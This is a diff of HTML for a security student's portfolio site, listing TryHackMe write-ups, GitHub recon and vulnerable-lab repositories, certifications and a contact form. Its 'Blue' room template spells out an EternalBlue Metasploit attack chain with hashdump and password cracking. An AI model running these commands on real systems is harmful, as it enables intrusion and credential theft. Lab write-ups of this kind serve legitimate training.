+        <div class="wrow__meta"><span class="diff diff--hard"><span class="diff__dots" aria-hidden="true"><i class="on"></i><i class="on"></i><i class="on"></i></span>Hard</span><span class="wrow__platform">TryHackMe</span></div>
+        <div class="wrow__main"><p class="wrow__topic">DFIR</p><h3 class="wrow__title">Memory Forensics</h3><p class="wrow__desc">Deep-dive analysis of a Windows memory dump using Volatility 3. Identified a live malware infection, extracted injected shellcode, recovered encryption keys, and documented a full IOC list.</p></div>
+        <div class="wrow__side"><ul class="wtags" aria-label="Topics"><li>Volatility</li><li>Memory Dump</li><li>Process Injection</li></ul><button class="more" type="button" data-writeup="memfor">Read more <span aria-hidden="true">→</span></button></div>
+      </li>
+      <li class="wrow" data-writeup="pickle" data-reveal>
+        <div class="wrow__meta"><span class="diff diff--easy"><span class="diff__dots" aria-hidden="true"><i class="on"></i><i class=""></i><i class=""></i></span>Easy</span><span class="wrow__platform">TryHackMe</span></div>
+        <div class="wrow__main"><p class="wrow__topic">Web Exploitation</p><h3 class="wrow__title">Pickle Rick</h3><p class="wrow__desc">A Rick &amp; Morty-themed web challenge. Identified command injection in a portal, bypassed keyword blacklisting, achieved RCE, and escalated to root to recover all three ingredient flags.</p></div>
+        <div class="wrow__side"><ul class="wtags" aria-label="Topics"><li>Command Injection</li><li>Web Enum</li><li>Gobuster</li></ul><button class="more" type="button" data-writeup="pickle">Read more <span aria-hidden="true">→</span></button></div>
+      </li>
+      <li class="wrow" data-writeup="pcap" data-reveal>
+        <div class="wrow__meta"><span class="diff diff--medium"><span class="diff__dots" aria-hidden="true"><i class="on"></i><i class="on"></i><i class=""></i></span>Medium</span><span class="wrow__platform">TryHackMe</span></div>
+        <div class="wrow__main"><p class="wrow__topic">Network Forensics</p><h3 class="wrow__title">PCAP Analysis</h3><p class="wrow__desc">Analysis of a malicious packet capture to identify C2 beaconing, reconstruct HTTP payload delivery, extract a dropped executable, and compile a full set of network-based IOCs.</p></div>
+        <div class="wrow__side"><ul class="wtags" aria-label="Topics"><li>Wireshark</li><li>C2 Detection</li><li>tshark</li></ul><button class="more" type="button" data-writeup="pcap">Read more <span aria-hidden="true">→</span></button></div>
+      </li>
+      <li class="wrow" data-writeup="adpen" data-reveal>
+        <div class="wrow__meta"><span class="diff diff--hard"><span class="diff__dots" aria-hidden="true"><i class="on"></i><i class="on"></i><i class="on"></i></span>Hard</span><span class="wrow__platform">TryHackMe</span></div>
+        <div class="wrow__main"><p class="wrow__topic">Active Directory</p><h3 class="wrow__title">AD Penetration</h3><p class="wrow__desc">Complete Active Directory penetration test from initial foothold to full domain compromise — BloodHound enumeration, Kerberoasting, Pass-the-Hash, and DCSync for NTDS.dit extraction.</p></div>
+        <div class="wrow__side"><ul class="wtags" aria-label="Topics"><li>Kerberoasting</li><li>BloodHound</li><li>DCSync</li></ul><button class="more" type="button" data-writeup="adpen">Read more <span aria-hidden="true">→</span></button></div>
+      </li>
+    </ol>
+    <div class="rooms">
+      <p class="label" data-reveal>TryHackMe rooms completed</p>
+      <ul class="rooms__grid">
+        <li><button class="room" type="button" data-writeup="rm-blue" data-reveal><span class="room__name">Blue</span><span class="diff diff--easy"><span class="diff__dots" aria-hidden="true"><i class="on"></i><i class=""></i><i class=""></i></span>Easy</span></button></li>
+        <li><button class="room" type="button" data-writeup="rm-vol" data-reveal><span class="room__name">Volatility</span><span class="diff diff--hard"><span class="diff__dots" aria-hidden="true"><i class="on"></i><i class="on"></i><i class="on"></i></span>Hard</span></button></li>
+        <li><button class="room" type="button" data-writeup="rm-crypt" data-reveal><span class="room__name">Cryptography</span><span class="diff diff--medium"><span class="diff__dots" aria-hidden="true"><i class="on"></i><i class="on"></i><i class=""></i></span>Medium</span></button></li>
+        <li><button class="room" type="button" data-writeup="rm-owasp" data-reveal><span class="room__name">OWASP Top 10</span><span class="diff diff--medium"><span class="diff__dots" aria-hidden="true"><i class="on"></i><i class="on"></i><i class=""></i></span>Medium</span></button></li>
+        <li><button class="room" type="button" data-writeup="rm-osint" data-reveal><span class="room__name">OSINT</span><span class="diff diff--easy"><span class="diff__dots" aria-hidden="true"><i class="on"></i><i class=""></i><i class=""></i></span>Easy</span></button></li>
+        <li><button class="room" type="button" data-writeup="rm-lpe" data-reveal><span class="room__name">Linux Privesc</span><span class="diff diff--medium"><span class="diff__dots" aria-hidden="true"><i class="on"></i><i class="on"></i><i class=""></i></span>Medium</span></button></li>
+        <li><button class="room" type="button" data-writeup="rm-ad" data-reveal><span class="room__name">Active Directory</span><span class="diff diff--hard"><span class="diff__dots" aria-hidden="true"><i class="on"></i><i class="on"></i><i class="on"></i></span>Hard</span></button></li>
+        <li><button class="room" type="button" data-writeup="rm-mal" data-reveal><span class="room__name">Malware Analysis</span><span class="diff diff--hard"><span class="diff__dots" aria-hidden="true"><i class="on"></i><i class="on"></i><i class="on"></i></span>Hard</span></button></li>
+        <li><button class="room" type="button" data-writeup="rm-ws" data-reveal><span class="room__name">Wireshark</span><span class="diff diff--medium"><span class="diff__dots" aria-hidden="true"><i class="on"></i><i class="on"></i><i class=""></i></span>Medium</span></button></li>
+        <li><button class="room" type="button" data-writeup="rm-jrpt" data-reveal><span class="room__name">Jr Pentester</span><span class="diff diff--easy"><span class="diff__dots" aria-hidden="true"><i class="on"></i><i class=""></i><i class=""></i></span>Easy</span></button></li>
+        <li><button class="room" type="button" data-writeup="rm-soc" data-reveal><span class="room__name">SOC Level 1</span><span class="diff diff--medium"><span class="diff__dots" aria-hidden="true"><i class="on"></i><i class="on"></i><i class=""></i></span>Medium</span></button></li>
+        <li><button class="room" type="button" data-writeup="rm-ir" data-reveal><span class="room__name">Incident Response</span><span class="diff diff--hard"><span class="diff__dots" aria-hidden="true"><i class="on"></i><i class="on"></i><i class="on"></i></span>Hard</span></button></li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- ============ TRYHACKME ============ -->
+<section class="sec sec--brown" id="tryhackme" aria-labelledby="thmTitle">
+  <div class="wrap">
+    <header class="sec__head sec__head--split">
+      <div>
+        <p class="label" data-reveal>TryHackMe</p>
+        <h2 class="sec__title" id="thmTitle" data-split>My ability card.</h2>
+      </div>
+      <p class="sec__sub" data-reveal>A snapshot of my TryHackMe profile: rank, rooms, consistency and learning paths. The numbers are maintained by hand, so the verification date matters.</p>
+    </header>
+    <div class="thm">
+      <article class="abcard" data-reveal>
+        <div class="abcard__main">
+          <p class="abcard__kicker">Hacker rank · TryHackMe</p>
+          <h3 class="abcard__user">bhaktabsharma</h3>
+          <p class="abcard__tag">Aspiring penetration tester · Top 1% globally</p>
+          <p class="snapshot"><span class="snapshot__tag">Profile snapshot</span>Entered manually, not live data. Last verified <time id="thmVerified" datetime="2026-11-11">11 Nov 2026</time>.</p>
+          <dl class="abcard__stats" id="thmStats">
+            <div><dt>Global rank</dt><dd data-count="1" data-prefix="Top " data-suffix="%">Top 1%</dd></div>
+            <div><dt>Rooms done</dt><dd data-count="200" data-suffix="+">200+</dd></div>
+            <div><dt>Day streak</dt><dd data-count="250" data-suffix="+">250+</dd></div>
+            <div><dt>Paths completed</dt><dd data-count="2">2</dd></div>
+          </dl>
+          <div class="abcard__foot">
+            <ul class="pills"><li>Jr Pentester ✓</li><li>SOC Level 1 ✓</li><li>250+ day streak</li></ul>
+            <a class="btn btn--gold" href="https://tryhackme.com/p/bhaktabsharma" target="_blank" rel="noopener">Verify profile <span aria-hidden="true">↗</span></a>
+          </div>
+        </div>
+        <div class="medal" aria-hidden="true" data-parallax="-0.04">
+          <div class="medal__face"><b>Top</b><strong>1%</strong><span>global</span></div>
+        </div>
+      </article>
+      <ul class="paths" id="thmPaths" data-reveal>
+        <li class="path path--done"><span class="path__mark" aria-hidden="true"></span><span class="path__name">Jr Penetration Tester</span><span class="path__state">Completed</span></li>
+        <li class="path path--done"><span class="path__mark" aria-hidden="true"></span><span class="path__name">SOC Level 1</span><span class="path__state">Completed</span></li>
+        <li class="path path--wip"><span class="path__mark" aria-hidden="true"></span><span class="path__name">Red Teaming</span><span class="path__state">In progress</span></li>
+        <li class="path path--wip"><span class="path__mark" aria-hidden="true"></span><span class="path__name">Cyber Defence</span><span class="path__state">In progress</span></li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- ============ GITHUB ============ -->
+<section class="sec sec--beige" id="github" aria-labelledby="ghTitle">
+  <div class="wrap">
+    <header class="sec__head sec__head--split">
+      <div>
+        <p class="label" data-reveal>GitHub</p>
+        <h2 class="sec__title" id="ghTitle" data-split>Open-source repositories.</h2>
+      </div>
+      <div class="sec__sub" data-reveal>
+        <p>My public repositories, loaded live from the GitHub API. If GitHub can’t be reached, the page shows a saved snapshot instead and says so.</p>
+        <p class="sec__cta"><a class="btn btn--gold" href="https://github.com/bhaktabsharma?tab=repositories" target="_blank" rel="noopener">Explore All Repositories <span aria-hidden="true">↗</span></a></p>
+      </div>
+    </header>
+
+    <div class="ghbar" data-reveal>
+      <p class="ghbar__status" id="ghStatus" role="status" aria-live="polite"><span class="ghbar__dot" aria-hidden="true"></span><span id="ghStatusText">Saved snapshot of my public repositories.</span></p>
+      <button type="button" class="more ghbar__retry" id="ghRetry" hidden>Try again</button>
+    </div>
+    <div class="langbar" id="ghLang" data-reveal><div class="langbar__bar" id="ghBar" role="img" aria-label="Languages across repositories: JavaScript 4, Shell 1, Python 1, TypeScript 1, HTML 1"><i style="flex:4;background:#f1e05a"></i><i style="flex:1;background:#89e051"></i><i style="flex:1;background:#3572A5"></i><i style="flex:1;background:#3178c6"></i><i style="flex:1;background:#e34c26"></i></div><ul class="langbar__key" id="ghKey"><li><i style="background:#f1e05a" aria-hidden="true"></i>JavaScript <b>4</b></li><li><i style="background:#89e051" aria-hidden="true"></i>Shell <b>1</b></li><li><i style="background:#3572A5" aria-hidden="true"></i>Python <b>1</b></li><li><i style="background:#3178c6" aria-hidden="true"></i>TypeScript <b>1</b></li><li><i style="background:#e34c26" aria-hidden="true"></i>HTML <b>1</b></li></ul></div>
+
+    <h3 class="gh-h">Featured projects</h3>
+    <div class="gfeat" id="ghFeatured">
+      <article class="frepo" data-gh="BugBounty-Recon-Engine">
+        <div class="frepo__top"><span class="repo__lang"><i style="background:#89e051" aria-hidden="true"></i><span class="js-lang">Shell</span></span><span class="status" data-status="public" data-status-for="bbrecon"><i aria-hidden="true"></i><b>Public repository</b></span></div>
+        <h4 class="frepo__name"><button type="button" data-repo="bbrecon">BugBounty-Recon-Engine</button></h4>
+        <p class="frepo__desc js-desc">Bug Bounty Recon Engine — 10-phase Bash pipeline: subdomain enum, HTTP probing, port scanning, URL/JS collection, fuzzing, Nuclei sweep &amp; takeover checks, with resumable checkpoints.</p>
+        <div class="frepo__foot"><span class="gh-stats"><span><span class="sr-only">Stars </span>★ <b class="js-stars">0</b></span><span><span class="sr-only">Forks </span>⑂ <b class="js-forks">0</b></span></span><a class="link" href="https://github.com/bhaktabsharma/BugBounty-Recon-Engine" target="_blank" rel="noopener">View on GitHub ↗</a></div>
+      </article>
+      <article class="frepo" data-gh="ReconForge">
+        <div class="frepo__top"><span class="repo__lang"><i style="background:#3572A5" aria-hidden="true"></i><span class="js-lang">Python</span></span><span class="status" data-status="public" data-status-for="reconkit"><i aria-hidden="true"></i><b>Public repository</b></span></div>
+        <h4 class="frepo__name"><button type="button" data-repo="reconkit">ReconForge</button></h4>
+        <p class="frepo__desc js-desc">Modular recon framework v2.0 — DNS enum, port scanning, subdomain BF, web fingerprinting, CVE hints, HTML report.</p>
+        <div class="frepo__foot"><span class="gh-stats"><span><span class="sr-only">Stars </span>★ <b class="js-stars">0</b></span><span><span class="sr-only">Forks </span>⑂ <b class="js-forks">0</b></span></span><a class="link" href="https://github.com/bhaktabsharma/ReconForge" target="_blank" rel="noopener">View on GitHub ↗</a></div>
+      </article>
+      <article class="frepo" data-gh="SQL-INJECTION-LAB">
+        <div class="frepo__top"><span class="repo__lang"><i style="background:#3178c6" aria-hidden="true"></i><span class="js-lang">TypeScript</span></span><span class="status" data-status="public" data-status-for="sqlilab"><i aria-hidden="true"></i><b>Public repository</b></span></div>
+        <h4 class="frepo__name"><button type="button" data-repo="sqlilab">SQL-INJECTION-LAB</button></h4>
+        <p class="frepo__desc js-desc">Full-stack SQL injection playground — React/Vite/Tailwind frontend, Node/Express backend, SQLite. 53 labs across classic, blind, time-based &amp; second-order injection.</p>
+        <div class="frepo__foot"><span class="gh-stats"><span><span class="sr-only">Stars </span>★ <b class="js-stars">0</b></span><span><span class="sr-only">Forks </span>⑂ <b class="js-forks">0</b></span></span><a class="link" href="https://github.com/bhaktabsharma/SQL-INJECTION-LAB" target="_blank" rel="noopener">View on GitHub ↗</a></div>
+      </article>
+    </div>
+
+    <div class="gh-listhead">
+      <h3 class="gh-h">Recently updated</h3>
+      <label class="switch"><input type="checkbox" id="ghForks"><span class="switch__box" aria-hidden="true"></span><span>Show forks</span></label>
+    </div>
+    <div class="fchips" id="ghChips" role="group" aria-label="Filter repositories by language" hidden></div>
+    <p class="tcount" id="ghCount" role="status" aria-live="polite"></p>
+    <ul class="repos" id="ghList">
+      <li class="repo" data-gh="BugBounty-Recon-Engine" data-repo="bbrecon">
+        <span class="repo__lang"><i style="background:#89e051" aria-hidden="true"></i><span class="js-lang">Shell</span></span>
+        <div class="repo__main"><h4 class="repo__name"><button type="button" data-repo="bbrecon">BugBounty-Recon-Engine</button></h4><p class="repo__desc js-desc">Bug Bounty Recon Engine — 10-phase Bash pipeline: subdomain enum, HTTP probing, port scanning, URL/JS collection, fuzzing, Nuclei sweep &amp; takeover checks, with resumable checkpoints.</p></div>
+        <div class="repo__stats"><span><span class="sr-only">Stars </span>★ <b class="js-stars">0</b></span><span><span class="sr-only">Forks </span>⑂ <b class="js-forks">0</b></span><span class="status" data-status="public" data-status-for="bbrecon"><i aria-hidden="true"></i><b>Public repository</b></span></div>
+        <a class="repo__go" href="https://github.com/bhaktabsharma/BugBounty-Recon-Engine" target="_blank" rel="noopener" aria-label="Open BugBounty-Recon-Engine on GitHub"><span aria-hidden="true">↗</span></a>
+      </li>
+      <li class="repo" data-gh="ReconForge" data-repo="reconkit">
+        <span class="repo__lang"><i style="background:#3572A5" aria-hidden="true"></i><span class="js-lang">Python</span></span>
+        <div class="repo__main"><h4 class="repo__name"><button type="button" data-repo="reconkit">ReconForge</button></h4><p class="repo__desc js-desc">Modular recon framework v2.0 — DNS enum, port scanning, subdomain BF, web fingerprinting, CVE hints, HTML report.</p></div>
+        <div class="repo__stats"><span><span class="sr-only">Stars </span>★ <b class="js-stars">0</b></span><span><span class="sr-only">Forks </span>⑂ <b class="js-forks">0</b></span><span class="status" data-status="public" data-status-for="reconkit"><i aria-hidden="true"></i><b>Public repository</b></span></div>
+        <a class="repo__go" href="https://github.com/bhaktabsharma/ReconForge" target="_blank" rel="noopener" aria-label="Open ReconForge on GitHub"><span aria-hidden="true">↗</span></a>
+      </li>
+      <li class="repo" data-gh="SQL-INJECTION-LAB" data-repo="sqlilab">
+        <span class="repo__lang"><i style="background:#3178c6" aria-hidden="true"></i><span class="js-lang">TypeScript</span></span>
+        <div class="repo__main"><h4 class="repo__name"><button type="button" data-repo="sqlilab">SQL-INJECTION-LAB</button></h4><p class="repo__desc js-desc">Full-stack SQL injection playground — React/Vite/Tailwind frontend, Node/Express backend, SQLite. 53 labs across classic, blind, time-based &amp; second-order injection.</p></div>
+        <div class="repo__stats"><span><span class="sr-only">Stars </span>★ <b class="js-stars">0</b></span><span><span class="sr-only">Forks </span>⑂ <b class="js-forks">0</b></span><span class="status" data-status="public" data-status-for="sqlilab"><i aria-hidden="true"></i><b>Public repository</b></span></div>
+        <a class="repo__go" href="https://github.com/bhaktabsharma/SQL-INJECTION-LAB" target="_blank" rel="noopener" aria-label="Open SQL-INJECTION-LAB on GitHub"><span aria-hidden="true">↗</span></a>
+      </li>
+      <li class="repo" data-gh="Faultline-Web-Security-Labs" data-repo="faultline">
+        <span class="repo__lang"><i style="background:#f1e05a" aria-hidden="true"></i><span class="js-lang">JavaScript</span></span>
+        <div class="repo__main"><h4 class="repo__name"><button type="button" data-repo="faultline">Faultline-Web-Security-Labs</button></h4><p class="repo__desc js-desc">Faultline — 36 self-hosted web app vulnerability labs across easy/medium/hard. Zero cloud dependency, dark/light mode, runs entirely on localhost.</p></div>
+        <div class="repo__stats"><span><span class="sr-only">Stars </span>★ <b class="js-stars">0</b></span><span><span class="sr-only">Forks </span>⑂ <b class="js-forks">0</b></span><span class="status" data-status="public" data-status-for="faultline"><i aria-hidden="true"></i><b>Public repository</b></span></div>
+        <a class="repo__go" href="https://github.com/bhaktabsharma/Faultline-Web-Security-Labs" target="_blank" rel="noopener" aria-label="Open Faultline-Web-Security-Labs on GitHub"><span aria-hidden="true">↗</span></a>
+      </li>
+      <li class="repo" data-gh="ReconQL-Passive-Recon-Console" data-repo="reconql">
+        <span class="repo__lang"><i style="background:#f1e05a" aria-hidden="true"></i><span class="js-lang">JavaScript</span></span>
+        <div class="repo__main"><h4 class="repo__name"><button type="button" data-repo="reconql">ReconQL-Passive-Recon-Console</button></h4><p class="repo__desc js-desc">ReconQL — Google dorking recon search engine. 23 categories, 91 pre-built queries covering subdomains, APIs, parameters, exposed files &amp; login panels.</p></div>
+        <div class="repo__stats"><span><span class="sr-only">Stars </span>★ <b class="js-stars">1</b></span><span><span class="sr-only">Forks </span>⑂ <b class="js-forks">0</b></span><span class="status" data-status="public" data-status-for="reconql"><i aria-hidden="true"></i><b>Public repository</b></span></div>
+        <a class="repo__go" href="https://github.com/bhaktabsharma/ReconQL-Passive-Recon-Console" target="_blank" rel="noopener" aria-label="Open ReconQL-Passive-Recon-Console on GitHub"><span aria-hidden="true">↗</span></a>
+      </li>
+      <li class="repo" data-gh="Crawlspace-Attack-Surface" data-repo="crawlspace">
+        <span class="repo__lang"><i style="background:#e34c26" aria-hidden="true"></i><span class="js-lang">HTML</span></span>
+        <div class="repo__main"><h4 class="repo__name"><button type="button" data-repo="crawlspace">Crawlspace-Attack-Surface</button></h4><p class="repo__desc js-desc">Crawlspace — attack-surface discovery taxonomy. 13 groups, 72 categories, each paired with a ready-made dorking query.</p></div>
+        <div class="repo__stats"><span><span class="sr-only">Stars </span>★ <b class="js-stars">0</b></span><span><span class="sr-only">Forks </span>⑂ <b class="js-forks">0</b></span><span class="status" data-status="public" data-status-for="crawlspace"><i aria-hidden="true"></i><b>Public repository</b></span></div>
+        <a class="repo__go" href="https://github.com/bhaktabsharma/Crawlspace-Attack-Surface" target="_blank" rel="noopener" aria-label="Open Crawlspace-Attack-Surface on GitHub"><span aria-hidden="true">↗</span></a>
+      </li>
+      <li class="repo" data-gh="CaseFile" data-repo="casefile">
+        <span class="repo__lang"><i style="background:#f1e05a" aria-hidden="true"></i><span class="js-lang">JavaScript</span></span>
+        <div class="repo__main"><h4 class="repo__name"><button type="button" data-repo="casefile">CaseFile</button></h4><p class="repo__desc js-desc">Personal security knowledgebase &amp; wiki — 979 topics across 16 categories, 56 full methodology write-ups and growing.</p></div>
+        <div class="repo__stats"><span><span class="sr-only">Stars </span>★ <b class="js-stars">0</b></span><span><span class="sr-only">Forks </span>⑂ <b class="js-forks">0</b></span><span class="status" data-status="public" data-status-for="casefile"><i aria-hidden="true"></i><b>Public repository</b></span></div>
+        <a class="repo__go" href="https://github.com/bhaktabsharma/CaseFile" target="_blank" rel="noopener" aria-label="Open CaseFile on GitHub"><span aria-hidden="true">↗</span></a>
+      </li>
+      <li class="repo" data-gh="XSS-Bugs-Lab" data-repo="xsslab">
+        <span class="repo__lang"><i style="background:#f1e05a" aria-hidden="true"></i><span class="js-lang">JavaScript</span></span>
+        <div class="repo__main"><h4 class="repo__name"><button type="button" data-repo="xsslab">XSS-Bugs-Lab</button></h4><p class="repo__desc js-desc">72 XSS practice labs — reflected, stored &amp; DOM-based — across deliberately vulnerable React, Vue &amp; Next.js environments with SQLite progress tracking.</p></div>
+        <div class="repo__stats"><span><span class="sr-only">Stars </span>★ <b class="js-stars">0</b></span><span><span class="sr-only">Forks </span>⑂ <b class="js-forks">0</b></span><span class="status" data-status="public" data-status-for="xsslab"><i aria-hidden="true"></i><b>Public repository</b></span></div>
+        <a class="repo__go" href="https://github.com/bhaktabsharma/XSS-Bugs-Lab" target="_blank" rel="noopener" aria-label="Open XSS-Bugs-Lab on GitHub"><span aria-hidden="true">↗</span></a>
+      </li>
+    </ul>
+    <p class="empty" id="ghEmpty" hidden>No repositories match this filter.</p>
+    <div class="gh-more"><button type="button" class="btn btn--dark" id="ghMore" hidden>Show more repositories</button></div>
+  </div>
+</section>
+
+<!-- ============ CERTIFICATIONS ============ -->
+<section class="sec sec--charcoal" id="certifications" aria-labelledby="certTitle">
+  <div class="wrap">
+    <header class="sec__head sec__head--split">
+      <div>
+        <p class="label" data-reveal>Certifications</p>
+        <h2 class="sec__title" id="certTitle" data-split>Certifications and credentials.</h2>
+      </div>
+      <p class="sec__sub" data-reveal>Completed credentials open a preview of the original certificate, with a link to the PDF. CEH v12 and CHFI are still in progress and are labelled that way.</p>
+    </header>
+    <div class="certs" id="certGrid" aria-live="polite"></div>
+    <noscript><div class="certs-fallback"><p>Certificate downloads (JavaScript is needed for previews):</p><ul><li><a href="assets/certificate.pdf" download="Bhakta-Sharma-NVH-Digital-Forensic-Certificate.pdf">NVH Digital Forensic (NewVersionHacker, 8 Jun 2026): download PDF</a></li><li><a href="assets/ceh_cert.pdf" download="Bhakta-Sharma-Ethical-Hacking-101-Certificate.pdf">Ethical Hacking 101: Beginners Guide (Simplilearn SkillUP, 12 Jun 2026): download PDF</a></li></ul></div></noscript>
+  </div>
+</section>
+
+<!-- ============ CONTACT ============ -->
+<section class="sec sec--black contact" id="contact" aria-labelledby="contactTitle">
+  <div class="wrap contact__layout">
+    <div class="contact__copy">
+      <p class="label" data-reveal>Contact</p>
+      <h2 class="contact__title" id="contactTitle" data-split>Have a security challenge? Let’s connect.</h2>
+      <p class="contact__lede" data-reveal>Open to cybersecurity opportunities, penetration testing, digital forensics, security research and meaningful collaborations.</p>
+      <ul class="contact__links" data-reveal>
+        <li><a href="mailto:bhaktabsharma@gmail.com"><span>Email</span><b>bhaktabsharma@gmail.com</b><i aria-hidden="true">↗</i></a></li>
+        <li><a href="https://www.linkedin.com/in/bhaktabsharma/" target="_blank" rel="noopener"><span>LinkedIn</span><b>linkedin.com/in/bhaktabsharma</b><i aria-hidden="true">↗</i></a></li>
+        <li><a href="https://github.com/bhaktabsharma" target="_blank" rel="noopener"><span>GitHub</span><b>github.com/bhaktabsharma</b><i aria-hidden="true">↗</i></a></li>
+        <li><a href="https://tryhackme.com/p/bhaktabsharma" target="_blank" rel="noopener"><span>TryHackMe</span><b>tryhackme.com/p/bhaktabsharma</b><i aria-hidden="true">↗</i></a></li>
+        <li><a href="https://instagram.com/beingbhaktaaaaa" target="_blank" rel="noopener"><span>Instagram</span><b>instagram.com/beingbhaktaaaaa</b><i aria-hidden="true">↗</i></a></li>
+      </ul>
+    </div>
+
+    <div class="contact__formwrap" data-reveal>
+      <form class="form" id="contactForm" novalidate>
+        <div class="field">
+          <label for="cf-name">Your name</label>
+          <input type="text" id="cf-name" name="name" placeholder="John Doe" autocomplete="name" maxlength="80" required aria-describedby="formError">
+        </div>
+        <div class="field">
+          <label for="cf-email">Email address</label>
+          <input type="email" id="cf-email" name="email" placeholder="john@company.com" autocomplete="email" inputmode="email" maxlength="120" required aria-describedby="formError">
+        </div>
+        <div class="field">
+          <label for="cf-subject">Subject</label>
+          <select id="cf-subject" name="subject">
+            <option>Job Opportunity</option>
+            <option>Freelance Project</option>
+            <option>Collaboration</option>
+            <option>Just Saying Hi</option>
+          </select>
+        </div>
+        <div class="field">
+          <label for="cf-message">Message</label>
+          <textarea id="cf-message" name="message" rows="5" placeholder="Tell me about the opportunity or project…" maxlength="1500" required aria-describedby="formError cf-count"></textarea>
+          <p class="field__count" id="cf-count" aria-live="off">0 / 1500</p>
+        </div>
+        <p class="form__error" id="formError" role="alert" hidden></p>
+        <button type="submit" class="btn btn--gold btn--block" id="cf-btn"><span class="btn__label">Send message</span> <span aria-hidden="true">→</span></button>
+        <p class="form__note">This site has no server. Sending opens your email app with the message filled in, and you press send there. Nothing is stored here and delivery can’t be confirmed from this page.</p>
+      </form>
+      <div class="form__done" id="formDone" hidden tabindex="-1">
+        <h3>Almost there</h3>
+        <p>Your email app has opened with your message ready to go. Press send there to deliver it.</p>
+        <p>Email app didn’t open? Copy your message and send it to <a class="link" href="mailto:bhaktabsharma@gmail.com">bhaktabsharma@gmail.com</a> from any email service.</p>
+        <p class="form__notice" id="formNotice" role="status" hidden></p>
+        <div class="form__btns">
+          <button type="button" class="btn btn--gold" id="copyMsg">Copy my message</button>
+          <button type="button" class="btn btn--ghost" id="copyEmail">Copy email address</button>
+          <button type="button" class="btn btn--ghost" id="formAgain">Write another message</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<footer class="foot" aria-label="Site footer">
+  <div class="wrap foot__inner">
+    <p class="foot__brand">BHAKTA<span>SEC</span></p>
+    <ul class="foot__status" aria-label="Status">
+      <li><span class="pulse" aria-hidden="true"></span>Open to opportunities</li>
+      <li>Siliguri, West Bengal, India</li>
+      <li>Local time <span data-clock></span></li>
+    </ul>
+    <p class="foot__copy">© 2026 Bhakta Sharma — BhaktaSec. <a href="mailto:bhaktabsharma@gmail.com">bhaktabsharma@gmail.com</a> · <a href="resume.html">Resume</a> · <a href="https://github.com/bhaktabsharma/Portfolio" target="_blank" rel="noopener">Source on GitHub</a></p>
+  </div>
+</footer>
+
+<button class="totop" id="totop" type="button" aria-label="Back to top">
+  <svg viewBox="0 0 48 48" aria-hidden="true"><circle class="totop__track" cx="24" cy="24" r="21"/><circle class="totop__ring" id="totopRing" cx="24" cy="24" r="21"/></svg>
+  <span aria-hidden="true">↑</span>
+</button>
+
+<!-- Detail dialog (tools, projects, repos, writeups, certificates) -->
+<dialog class="modal" id="modal" aria-labelledby="modalTitle">
+  <div class="modal__panel" id="modalPanel">
+    <div class="modal__head">
+      <p class="modal__crumb" id="modalCrumb">BHAKTASEC</p>
+      <button class="modal__close" id="modalClose" type="button" aria-label="Close details"><span aria-hidden="true">Close ✕</span></button>
+    </div>
+    <div class="modal__body" id="modalBody"></div>
+  </div>
+</dialog>
+
+<!-- Writeup, room and certificate content (rendered into the dialog on demand) -->
+<!-- WRITEUP TEMPLATES -->
+<template id="wp-rm-blue">
+  <div class="writeup-page">
+    <div class="wmodal-eyebrow easy">// TRYHACKME ROOM · WINDOWS · EXPLOITATION</div>
+    <h2 class="wmodal-title">🪟 Blue</h2>
+    <p class="wmodal-subtitle">Exploit a Windows machine vulnerable to MS17-010 (EternalBlue). Covers the full attack chain from scanning to post-exploitation credential dumping.</p>
+    <div class="wmodal-tags"><span class="tag">SMB</span><span class="tag">EternalBlue</span><span class="tag">Metasploit</span><span class="tag">Windows</span><span class="tag">Hashdump</span></div>
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ What I Learned</span>
+    <ul>
+      <li><strong>Nmap vulnerability scripts</strong> — using <code>--script vuln</code> to detect MS17-010 without manual CVE lookup.</li>
+      <li><strong>Metasploit module selection</strong> — difference between <code>ms17_010_eternalblue</code> and <code>ms17_010_psexec</code>, and when to use each.</li>
+      <li><strong>Meterpreter post-exploitation</strong> — <code>hashdump</code>, <code>getsystem</code>, shell migration for stable sessions.</li>
+      <li><strong>NTLM hash cracking</strong> — offline cracking with John the Ripper using rockyou.txt wordlist.</li>
+    </ul>
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ Key Commands</span>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>attack chain</span></div>
+      <pre><span class="cmd">nmap -sV --script vuln -p 445 &lt;TARGET&gt;</span>
+<span class="hi">→ VULNERABLE: smb-vuln-ms17-010</span>
+<span class="cmd">use exploit/windows/smb/ms17_010_eternalblue</span>
+<span class="cmd">set RHOSTS &lt;TARGET&gt; ; run</span>
+<span class="hi">→ Meterpreter session opened as NT AUTHORITY\SYSTEM</span>
+<span class="cmd">hashdump</span>
+<span class="hi">→ NTLM hashes for all local accounts</span>
+<span class="cmd">john --format=NT hashes.txt --wordlist=rockyou.txt</span></pre>
+    </div>
+    <div class="wflag"><span class="wflag-icon">🏆</span><div><span class="wflag-label">Room Status</span><span class="wflag-val">Completed · All 3 flags captured</span></div></div>
+  </div>
+</template>
+
+<template id="wp-rm-vol">
+  <div class="writeup-page">
+    <div class="wmodal-eyebrow medium">// TRYHACKME ROOM · MEMORY FORENSICS</div>
+    <h2 class="wmodal-title">🧠 Volatility</h2>
+    <p class="wmodal-subtitle">Hands-on memory forensics using the Volatility framework. Learned to triage memory dumps, detect process injection, extract network artefacts, and dump credentials from RAM.</p>
+    <div class="wmodal-tags"><span class="tag">Volatility</span><span class="tag">Memory Forensics</span><span class="tag">DFIR</span><span class="tag">Malware</span><span class="tag">Process Injection</span></div>
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ What I Learned</span>
+    <ul>
+      <li><strong>Image profiling</strong> — using <code>windows.info</code> to identify OS version and kernel base before any analysis.</li>
+      <li><strong>Process anomaly detection</strong> — <code>windows.pstree</code> and <code>windows.psscan</code> to spot orphaned or hidden processes.</li>
+      <li><strong>Injection detection</strong> — <code>windows.malfind</code> flags memory regions that are executable, writable, and contain PE headers.</li>
+      <li><strong>Credential extraction</strong> — <code>windows.hashdump</code> and <code>windows.lsadump</code> to pull NTLM hashes directly from RAM.</li>
+      <li><strong>Network artefacts</strong> — <code>windows.netstat</code> for open connections even after the process terminates (from pool memory).</li>
+    </ul>
+    <div class="wmodal-divider"></div>
